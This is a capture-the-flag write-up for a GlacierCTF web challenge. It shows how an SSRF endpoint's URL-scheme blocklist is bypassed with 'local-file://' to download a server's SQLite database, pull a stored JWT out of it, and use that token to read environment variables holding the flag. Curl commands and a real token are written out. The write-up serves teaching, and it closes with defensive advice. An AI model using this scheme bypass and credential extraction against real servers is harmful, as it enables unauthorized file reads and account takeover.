# Challenge

The Top Glacier Blog provides you with the latest news from the community about a variety of topics. Wheter it is local news or global news, you are always up to date.

https://glacier-top-news.ctf.glacierctf.com/

# Writeup

The flag is saved in the environment:

```bash
WERKZEUG_HIDDEN_FLAG=glacierctf{dummy_flag}
```

The python code reads the flag in the api `/api/system_info`:

```python
def get_system_info():
    _, _, load15 = psutil.getloadavg()
    cpu_usage = (load15/multiprocessing.cpu_count()) * 100

    env_var = {
      key: os.environ[key]
      for key in os.environ
      if "PORT" not in key and "HOST" not in key and "KEY" not in key
    }

    return {
        'environment': env_var,
        'machine': platform.machine(),
        'version': platform.version(),
        'platform': platform.platform(),
        'system': platform.system(),
        'cpu_usage': cpu_usage,
        'ram_usage': psutil.virtual_memory().percent,
    }

@app.route('/api/system_info', methods=['POST'])
@require_jwt
def get_system_information():
    return get_system_info(), 200, {'Content-Type': 'application/json'}
```

However, the api endpoint is protected by jwt token. The token is saved in the sqlite3 db `/tmp/glacier.db`:

```python
@singleton
class Database:
    __instance = None

    def __init__(self, database_name="/tmp/glacier.db"):
        self.connection = sqlite3.connect(database_name)
```

So we need to extract the jwt token from the database. Digging the code, there is a SSRF vulnerability in the following code:

```python
@app.route('/api/get_resource', methods=['POST'])
def get_resource():
    url = request.json['url']

    if(Filter.isBadUrl(url)):
        return 'Illegal Url Scheme provided', 500

    content = urlopen(url)
    return content.read(), 200
```

It filters some url schemes:

```python
    BAD_URL_SCHEMES = ['file', 'ftp', 'local_file']

    @staticmethod
    def isBadUrl(url):
        return Filter.bad_schema(url)
```

But we can still access the file with `local-file:///tmp/glacier.db`. Download the database and read the secret out:

```shell
$ curl -H 'content-type: application/json' -X POST https://glacier-top-news.ctf.glacierctf.com/api/get_resource -d '{"url":"local-file:///tmp/glacier.db"}' > glacier.db
$ sqlite3 glacier.db
sqlite> select * from secrets;
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIn0.PoalYA6obPe0HioumOlffOuLKyG80Y5GCkbCmL15pyY
```

Capture the flag with the jwt:

```shell
curl -H 'cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIn0.PoalYA6obPe0HioumOlffOuLKyG80Y5GCkbCmL15pyY' -X POST https://glacier-top-news.ctf.glacierctf.com/api/system_info 
# => glacierctf{Py2_I5Su3s_g0_brrrr}
```

# Conclusion

Do not allow SSRF. Do not use Python2 anymore.